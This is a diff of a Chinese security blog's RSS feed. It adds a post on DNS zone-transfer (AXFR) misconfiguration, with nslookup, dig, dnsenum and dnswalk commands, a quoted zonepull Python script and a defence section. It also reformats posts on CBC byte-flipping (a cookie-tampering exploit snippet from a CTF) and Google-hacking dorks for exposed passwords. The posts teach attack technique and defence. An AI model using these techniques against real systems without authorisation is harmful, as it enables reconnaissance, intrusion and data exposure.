@@ -5,19 +5,208 @@
     <description>Really cool blog about ... something</description>
     <link></link>
     <atom:link href="feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 08 Aug 2015 19:16:01 +0800</pubDate>
-    <lastBuildDate>Sat, 08 Aug 2015 19:16:01 +0800</lastBuildDate>
+    <pubDate>Wed, 02 Sep 2015 15:11:45 +0800</pubDate>
+    <lastBuildDate>Wed, 02 Sep 2015 15:11:45 +0800</lastBuildDate>
     <generator>Jekyll v2.5.3</generator>
     
       <item>
-        <title>CBC字节翻转攻击-101Approach</title>
-        <description>&lt;h2 id=&quot;x00-&quot;&gt;0x00 译者前言&lt;/h2&gt;
+        <title>DNS域传送漏洞学习总结</title>
+        <description>&lt;h1 id=&quot;x01-&quot;&gt;0x01 前言&lt;/h1&gt;
 
-&lt;p&gt;本文翻译自：http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/
-drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/4975&quot;&gt;使用CBC比特反转攻击绕过加密的会话令牌&lt;/a&gt;
+&lt;p&gt;本文是关于DNS域传送漏洞的学习与总结。&lt;/p&gt;
+
+&lt;p&gt;在&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》&lt;/a&gt;第一期中有：区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的 zone 数据库。这为运行中的 DNS 服务提供了一定的冗余度,其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说,DNS区域传送操作只在网络里真的有后备域名 DNS 服务器时才有必要执行,但许多 DNS 服务器却被错误地配置成&lt;strong&gt;只要有人发出请求&lt;/strong&gt;,就会向对方提供一个 zone 数据库的&lt;strong&gt;拷贝&lt;/strong&gt;。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关,那么这种错误配置不一定是坏事,尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用 DNS 机制来分割外部公用 DNS 信息和内部私用 DNS 信息的时候,此时内部主机名和 IP 地址都暴露给了攻击者。把内部 IP 地址信息提供给因特网上不受信任的用户,就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。对系统管理员来说,允许不受信任的因特网用户执行 DNS 区域传送(&lt;code&gt;zone transfer&lt;/code&gt;)操作是后果最为严重的错误配置之一。&lt;/p&gt;
+
+&lt;p&gt;同时，在&lt;a href=&quot;http://wiki.wooyun.org/information:domain&quot;&gt;WooYun WiKi&lt;/a&gt;中也说道，利用DNS域传送漏洞可以有效地收集相关企业的子域名，收集信息也是渗透过程中很关键的一步。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-&quot;&gt;0x02 攻击方法&lt;/h1&gt;
+
+&lt;h2 id=&quot;windowsnslookup&quot;&gt;Windows下使用nslookup&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;先设置查找类型为NS，查找出对应主机域的域名服务器。（或直接键入nslookup进入交互模式，再通过&lt;code&gt;set type=ns&lt;/code&gt;进行设置）&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;C:\&amp;gt;nslookup -qa=ns test.com&lt;/code&gt;&lt;/p&gt;
+
+    &lt;p&gt;会返回类似结果：&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;    Server:  bogon
+    Address:  172.16.162.2           
+
+    Non-authoritative answer:
+    test.com        nameserver = ns66.worldnic.com
+    test.com        nameserver = ns65.worldnic.com
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用nslookup命令进入交互模式，更改默认服务器为刚才查询的域名服务器&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;&amp;gt; server=ns66.worldnic.com&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;列出服务器上所有的DNS记录&lt;/p&gt;
+
+    &lt;p&gt;&lt;code&gt;&amp;gt; ls -d test.com&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;nslookup命令参考：&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2441&quot;&gt;《nslookup通往DNS的桥梁》-linux命令五分钟系列之三十三&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;nslookup进入交互模式后查看帮助：&lt;code&gt;&amp;gt;help&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;kalidig-dnsenum-dnswalk&quot;&gt;Kali下使用dig, dnsenum, dnswalk&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dig&lt;/code&gt;命令进行全量传输&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;AXFR&lt;/a&gt;（从域名服务器从主域名服务器上请求zone文件）&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  dig @dnsserver name querytype
+  dig @192.168.5.6 test.com axfr
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dnsenum&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  ./dnsenum.pl –enum test.com
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;使用&lt;code&gt;dnswalk&lt;/code&gt;获取测试对象全部的 DNS 解析记录信息，注意域名后有一个点&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code&gt;  ./dnswalk test.com.
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;相关命令参考：&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;http://www.hackcto.com/post/2013-01-15/40047740289&quot;&gt;《安全参考》第一期&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/64&quot;&gt;DNS域传送信息泄露&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;http://roclinux.cn/?p=2449&quot;&gt;《dig挖出DNS的秘密》-linux命令五分钟系列之三十四&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;x03-python&quot;&gt;0x03 攻击Python脚本分析&lt;/h2&gt;
+
+&lt;p&gt;一看Github上有，就拿来分析一下吧，&lt;a href=&quot;https://github.com/kaizoku/zonepull/blob/master/zonepull/zonepull.py&quot;&gt;kaizoku/zonepull&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
+### Zonepuller
+## Attempts to get a domain transfer from the nameservers for the given domain
+## Requires dnspython http://www.dnspython.org/    
+
+import sys
+import socket
+import optparse
+try:
+    from dns import resolver, query, exception
+except ImportError:
+    print &quot;This script requires dnspython&quot;
+    print &quot;http://www.dnspython.org/&quot;
+    sys.exit(1)    
+
+
+
+class Transferrer(object):
+    def __init__(self, domain):
+        self.domain = domain
+        ## build list of nameservers
+        nss = resolver.query(domain, 'NS')
+        self.nameservers = [ str(ns) for ns in nss ]    
+
+
+    def transfer(self):
+        for ns in self.nameservers:
+            print &amp;gt;&amp;gt; sys.stderr, &quot;Querying %s&quot; % (ns,)
+            print &amp;gt;&amp;gt; sys.stderr, &quot;-&quot; * 50
+            z = self.query(ns)
+            print z
+            print &amp;gt;&amp;gt; sys.stderr, &quot;%s\n&quot; % (&quot;-&quot; * 50,)    
+
+
+    def query(self, ns):
+        nsaddr = self.resolve_a(ns)
+        try:
+            z = self.pull_zone(nsaddr)
+        except (exception.FormError, socket.error, EOFError):
+            print &amp;gt;&amp;gt; sys.stderr, &quot;AXFR failed\n&quot;
+            return None
+        else:
+            return z    
+
+
+    def resolve_a(self, name):
+        &quot;&quot;&quot;Pulls down an A record for a name&quot;&quot;&quot;
+        nsres = resolver.query(name, 'A')
+        return str(nsres[0])    
+
+
+    def pull_zone(self, nameserver):
+        &quot;&quot;&quot;Sends the domain transfer request&quot;&quot;&quot;
+        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
+        zone = &quot;&quot;   ## janky, but this library returns
+        for m in q: ## an empty generator on timeout
+            zone += str(m)
+        if not zone:
+            raise EOFError
+        return zone    
+
+
+def main():
+    parser = optparse.OptionParser(usage=&quot;%prog &amp;lt;domain&amp;gt;&quot;, version=&quot;%prog 0.1&quot;)
+    options, args = parser.parse_args()
+    if not args:
+        parser.error(&quot;Must include at least one domain to transfer&quot;)    
+
+    for dom in args:
+        t = Transferrer(dom)
+        t.transfer()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;分析：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;程序先尝试导入dns，没有安装dnspython则退出&lt;/li&gt;
+  &lt;li&gt;定义Transferrer()类来完成主要的域传送检测，先使用&lt;code&gt;resolver.query(domain, 'NS')&lt;/code&gt;方法查询对应域名的NS记录，并将其作为域名服务器查询其A记录，最后使用&lt;code&gt;query.xfr(nameserver, self.domain, relativize=False, timeout=2)&lt;/code&gt;尝试进行域传送&lt;/li&gt;
+  &lt;li&gt;main()函数主要对命令行传入的域名进行单线程串行检测是否存在DNS域传送&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tips&quot;&gt;Tips：&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code&gt;print &amp;gt;&amp;gt; sys.stderr, &quot;Message&quot;&lt;/code&gt;可将信息重定向输出到标准错误输出当中&lt;/li&gt;
+  &lt;li&gt;&lt;code&gt;parser.error(&quot;Message&quot;)&lt;/code&gt;可用于选项解析错误提示&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;x04-&quot;&gt;0x04 防御方法&lt;/h2&gt;
+
+&lt;p&gt;在相应的zone、options中添加allow-transfer限制，具体见&lt;a href=&quot;http://wiki.wooyun.org/doku.php?id=server:zone-transfer&quot;&gt;DNS 域传送漏洞&lt;/a&gt;。这里还存在的&lt;strong&gt;问题&lt;/strong&gt;是：未对DNS服务和DNS服务器深入了解，攻击也没有重现，还有待深入学习，而且DNS的问题也不止这些，&lt;a href=&quot;http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html&quot;&gt;推荐看看&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 02 Sep 2015 21:30:00 +0800</pubDate>
+        <link>/studying/2015/09/02/DNS-zone-transfer-studying.html</link>
+        <guid isPermaLink="true">/studying/2015/09/02/DNS-zone-transfer-studying.html</guid>
+        
+        
+        <category>studying</category>
+        
+      </item>
+    
+      <item>
+        <title>CBC字节翻转攻击-101Approach</title>
+        <description>&lt;p&gt;##0x00 译者前言##&lt;/p&gt;
+
+&lt;p&gt;本文翻译自：http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/&lt;br /&gt;
+drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/4975&quot;&gt;使用CBC比特反转攻击绕过加密的会话令牌&lt;/a&gt;&lt;br /&gt;
 缘起是糖果出的一道题，看到原文作者对这一问题阐述的较为详细，虽然时间有些久远，但翻译一下可与诸君学习一下思考问题的方法。&lt;/p&gt;
 
-&lt;h2 id=&quot;x01-&quot;&gt;0x01 相关介绍&lt;/h2&gt;
+&lt;p&gt;##0x01 相关介绍##&lt;/p&gt;
 
 &lt;p&gt;此攻击方法的精髓在于：&lt;strong&gt;通过损坏密文字节来改变明文字节&lt;/strong&gt;。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。&lt;/p&gt;
 
@@ -25,11 +214,11 @@ drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/49
 
 &lt;p&gt;在这里只是解释一下关于攻击必须要理解的部分。（即：一图胜千言）&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;加密过程&lt;/strong&gt;
-&lt;img src=&quot;/assets/images/20150808/Encryption.png&quot; alt=&quot;Encryption&quot; /&gt;
-&lt;strong&gt;Plaintext&lt;/strong&gt;：待加密的数据。
-&lt;strong&gt;IV&lt;/strong&gt;：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
-&lt;strong&gt;Key&lt;/strong&gt;：被一些如AES的对称加密算法使用。
+&lt;p&gt;&lt;strong&gt;加密过程&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/images/20150808/Encryption.png&quot; alt=&quot;Encryption&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Plaintext&lt;/strong&gt;：待加密的数据。&lt;br /&gt;
+&lt;strong&gt;IV&lt;/strong&gt;：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。&lt;br /&gt;
+&lt;strong&gt;Key&lt;/strong&gt;：被一些如AES的对称加密算法使用。&lt;br /&gt;
 &lt;strong&gt;Ciphertext&lt;/strong&gt;：加密后的数据。&lt;/p&gt;
 
 &lt;p&gt;在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为&lt;em&gt;块&lt;/em&gt;。在本文中，我们将使用包含16字节的块。&lt;/p&gt;
@@ -43,7 +232,7 @@ drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/49
 
 &lt;p&gt;注意：正如你所见，&lt;strong&gt;前一块的密文用来产生后一块的密文&lt;/strong&gt;。&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Decryption Process&lt;/strong&gt;
+&lt;p&gt;&lt;strong&gt;Decryption Process&lt;/strong&gt;&lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150808/Decryption.png&quot; alt=&quot;Decryption&quot; /&gt;&lt;/p&gt;
 
 &lt;ul&gt;
@@ -51,10 +240,10 @@ drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/49
   &lt;li&gt;&lt;em&gt;Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1&lt;/em&gt;—用于第二及剩下的组块&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;注意：&lt;strong&gt;&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）是用来产生下一块明文&lt;/strong&gt;；这就是字节翻转攻击开始发挥作用的地方。如果我们改变&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！&lt;strong&gt;You got it?&lt;/strong&gt;别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：
+&lt;p&gt;注意：&lt;strong&gt;&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）是用来产生下一块明文&lt;/strong&gt;；这就是字节翻转攻击开始发挥作用的地方。如果我们改变&lt;em&gt;Ciphertext-N-1&lt;/em&gt;（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！&lt;strong&gt;You got it?&lt;/strong&gt;别担心，下面我们将看到一个详细的例子。与此同时，下面的这张图也可以很好地说明这种攻击：&lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150808/attack.jpg&quot; alt=&quot;attack&quot; /&gt;&lt;/p&gt;
 
-&lt;h2 id=&quot;x02-cbc-blocks-of-16-bytes&quot;&gt;0x02 一个例子（CBC Blocks of 16 bytes）&lt;/h2&gt;
+&lt;p&gt;##0x02 一个例子（CBC Blocks of 16 bytes）##&lt;/p&gt;
 
 &lt;p&gt;比方说，我们有这样的明文序列：&lt;/p&gt;
 
@@ -89,7 +278,7 @@ drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/49
   &lt;li&gt;&lt;code&gt;$b = @decrypt($enc);&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;运行这段代码后，我们可以将数字6变为7：
+&lt;p&gt;运行这段代码后，我们可以将数字6变为7：&lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150808/pic1.png&quot; alt=&quot;pic1&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;但是我们在第3行中，是如何改变字节成为我们想要的值呢？&lt;/p&gt;
@@ -137,11 +326,11 @@ drops里的相关主题文章：&lt;a href=&quot;http://drops.wooyun.org/tips/49
 &lt;span class=&quot;x&quot;&gt;    $b = @decrypt($enc);&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt;    echo &amp;quot;Plaintext AFTER attack : $b\n&amp;quot;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;x03-&quot;&gt;0x03 一个练习&lt;/h2&gt;
+&lt;p&gt;##0x03 一个练习##&lt;/p&gt;
 
 &lt;p&gt;光说不练假把式，接下来作者举了一个他参加过的CTF中的一道题目的例子（更多详情可以参阅最后的相关参考链接），然后阐述了他是怎样在最后几步中打破CBC的。&lt;/p&gt;
 
-&lt;p&gt;下面提供了这个练习当中很重要的一部分源码：
+&lt;p&gt;下面提供了这个练习当中很重要的一部分源码：&lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150808/pic2.png&quot; alt=&quot;pic2&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;其中，你在POST提交参数”name”的任何文本值之后，应用程序则会对应输出”Hello”加上最后提交的文本。但是有两件事情发生在消息打印之前：&lt;/p&gt;
@@ -166,7 +355,7 @@ val = chr(ord('X') ^ ord(&quot;'&quot;) ^ ord(cookie[pos]))
 exploit = cookie[0:pos] + val + cookie[pos + 1:]
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：
+&lt;p&gt;然后作者通过改变cookie（因为其具有全部的密文），得到以下结果：&lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150808/pic3.png&quot; alt=&quot;pic3&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;首先，因为我们改变了第一块，所以在第二块中，黄色标记的”X”被成功替换为单引号，它被认为是多余插入（绿色），导致在unserialize()处理数据时产生一个错误（红色），因此应用程序甚至都没有去尝试执行注入了。&lt;/p&gt;
@@ -180,7 +369,7 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
 
 &lt;p&gt;在发送上述字符串后，unserialize()并没有报错，并且我们的shell命令成功执行！！！&lt;/p&gt;
 
-&lt;h2 id=&quot;x04-&quot;&gt;0x04 相关参考&lt;/h2&gt;
+&lt;p&gt;##0x04 相关参考##&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;CRYPTO #2: http://blog.gdssecurity.com/labs/tag/crypto&lt;/li&gt;
@@ -188,7 +377,7 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
   &lt;li&gt;http://hardc0de.ru/2013/08/04/ebctf-web400/&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&quot;x05-&quot;&gt;0x05 附录代码&lt;/h2&gt;
+&lt;p&gt;##0x05 附录代码##&lt;/p&gt;
 
 &lt;p&gt;下面是上面练习当中的PHP源码及exp：&lt;/p&gt;
 
@@ -346,16 +535,16 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
     
       <item>
         <title>基础级Google Hacking</title>
-        <description>&lt;h2 id=&quot;x00-&quot;&gt;0x00 引言&lt;/h2&gt;
+        <description>&lt;p&gt;##0x00 引言 ##&lt;/p&gt;
 
 &lt;p&gt;“无用信息输入，无用信息输出”，本文适当总结脚本小子的Google Hacking方法未涉及脚本自动化处理数据，翻墙请自备，大神请轻喷。鄙人觉得也应当配合不同的搜索引擎使用相应的搜索语法组合出最佳的结果，当然可以由自动化工具实现或学习相关*HDB进行手工搜索。(下文中“===”代表搜索结果相同)&lt;/p&gt;
 
 &lt;!--more--&gt;
 
-&lt;h2 id=&quot;x01-google&quot;&gt;0x01 Google搜索基础知识&lt;/h2&gt;
+&lt;p&gt;##0x01 Google搜索基础知识 ##&lt;/p&gt;
 
 &lt;ol&gt;
-  &lt;li&gt;手气不错，自定义搜索结果，语言设置，高级设置大家都懂哈 
+  &lt;li&gt;手气不错，自定义搜索结果，语言设置，高级设置大家都懂哈 &lt;br /&gt;
 &lt;img src=&quot;/assets/images/20150328/1.png&quot; alt=&quot;Example&quot; /&gt;&lt;/li&gt;
   &lt;li&gt;基本搜素：一个或一组单词(google hacker);双引号封装的词组(“Google Hacking”)&lt;/li&gt;
   &lt;li&gt;Google搜索的黄金法则：
@@ -374,13 +563,13 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
       &lt;li&gt;注意：Google从左到右读取查询，操作符之间拥有相同优先级，且搜索不受括号影响。例如：intext:(password | passcode) intext:(username | userid | user) filetype:csv&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-  &lt;li&gt;使用Google URL:
- 当你提交完一个Google查询之后，可以看到相应的Google结果页面，而这个页面的URL可以用于修改一个查询的或者在以后重新使用这个查询 &lt;br /&gt;
- 例如：www.google.com.hk/search?variable1=value&amp;amp;variable2=value&lt;br /&gt;
+  &lt;li&gt;使用Google URL:&lt;br /&gt;
+ 当你提交完一个Google查询之后，可以看到相应的Google结果页面，而这个页面的URL可以用于修改一个查询的或者在以后重新使用这个查询   &lt;br /&gt;
+ 例如：www.google.com.hk/search?variable1=value&amp;amp;variable2=value  &lt;br /&gt;
  相关URL参数列表 &lt;a href=&quot;http://ylbook.com/cms/web/gugecanshu.htm&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&quot;x02-google&quot;&gt;0x02 Google高级操作符&lt;/h2&gt;
+&lt;p&gt;##0x02 Google高级操作符##&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;操作符语法：
@@ -401,13 +590,13 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
       &lt;li&gt;allinurl: 在页面的URL中查找所有的关键字&lt;/li&gt;
       &lt;li&gt;filetype: 根据文件扩展名查找特定类型的 文件，等同于ext，也需要附加搜索关键字&lt;/li&gt;
       &lt;li&gt;site: 限定在某个特定的网站或者域搜索，也可以单独使用&lt;/li&gt;
-      &lt;li&gt;cache: 现实页面的缓存版本，但不能很好地与其他操作符或者关键字混合使用 &lt;br /&gt;
+      &lt;li&gt;cache: 现实页面的缓存版本，但不能很好地与其他操作符或者关键字混合使用   &lt;br /&gt;
  &lt;img src=&quot;/assets/images/20150328/2.png&quot; alt=&quot;example&quot; /&gt;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h2 id=&quot;x03-google-hacking-wooyun&quot;&gt;0x03 Google Hacking Wooyun案例：&lt;/h2&gt;
+&lt;p&gt;##0x03 Google Hacking Wooyun案例：##&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;具体的Google Hacking一般性练手：
@@ -458,7 +647,7 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;x04-&quot;&gt;0x04 相关防卫措施&lt;/h2&gt;
+&lt;p&gt;##0x04 相关防卫措施 ##&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;禁止目录列表、错误信息和不当的配置或者删除默认页面及配置&lt;/li&gt;
@@ -467,7 +656,7 @@ exploit = cookie[0:pos] + val + cookie[pos + 1:]
   &lt;li&gt;使用Google的Webmaster删除页面的缓存版本&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;x05-&quot;&gt;0x05 扩展及参考资料&lt;/h2&gt;
+&lt;p&gt;##0x05 扩展及参考资料 ##&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;owasp-testing-guide-v4 &lt;a href=&quot;http://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/index.html&quot;&gt;Link&lt;/a&gt;&lt;/li&gt;
